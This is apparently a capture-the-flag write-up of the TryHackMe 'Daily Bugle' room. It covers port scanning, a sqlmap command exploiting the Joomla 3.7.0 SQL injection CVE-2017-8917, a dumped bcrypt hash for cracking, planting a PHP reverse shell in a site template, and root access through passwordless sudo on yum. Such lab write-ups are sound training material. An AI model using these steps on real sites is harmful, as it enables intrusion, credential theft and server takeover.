# THM Daily Bugle

## Description
Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

The website being hacked. Help me recover it. 


## Reconnaise.
```
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB (unauthorized)
```
**Open port 3306**
Why is port 3306 vulnerable?
MySQL port - 3306 is used by MySQL server to listen requests from clients. Allowing inbound traffic from all external IP addresses to MySQL is vulnerable to DoS, Buffer Overflow, SQL Injection attacks.

![image](https://hackmd.io/_uploads/S1sGk7NsT.png)

`CMS -- JOOMLA 3.7.0`

Potential user
`Username : Super User`


## Scanning and Enumeration
### Website
Early scanning to /robots.txt show all the directory list below.
```
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

Further scanning using Joomscan, manage to identify version that leads to Initial Access.
```
/administrator/

[++] Joomla 3.7.0
"CVE-2017-8917 SQL injection Vulnerability in Joomla! 3.7.0"

http://10.10.124.154/administrator/components
http://10.10.124.154/administrator/modules
http://10.10.124.154/administrator/templates
http://10.10.124.154/images/banners




```

Using exploit from this github https://github.com/stefanlucas/Exploit-Joomla

### CVE-2017-8917 
SQL injection Vulnerability in Joomla! 3.7.0.

```
URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

The vulnerable happen when **com_field** borrow some parameter from the admin side components.


## Credential Dump
Result from proof of concept.
```
'811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
```
The hash that being use are bcrypt. Crack using JTR and HashCat. 
![image](https://hackmd.io/_uploads/SkMltmEj6.png)



## Initial Access
Manage to get credential for Super User. Let put payload in one of template.
![image](https://hackmd.io/_uploads/B1SkrXEsp.png)
Upload php revershell in template > index.php
Refresh index page. and we got connection.

## User 
Login as **apache** user, the major hint to look in web configuration file, apache log.

![image](https://hackmd.io/_uploads/Hyd5v74iT.png)
It might contains user password.Manage to get user flag from here. 


## PrivEsca
Using sudo -l to check user privilege. It can access root without password for /usr/share/bin/yum.

```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Moving to gtfobin yum and Follow all the step 
Mange to get root. 
![image](https://hackmd.io/_uploads/BymwdQViT.png)
    


## Learning
Explaination on vulnerbilities Joomla 3.7.0
Create Vuln docker with Joomla 3.7.0 (password are flag)
Create privesc docker with yum.

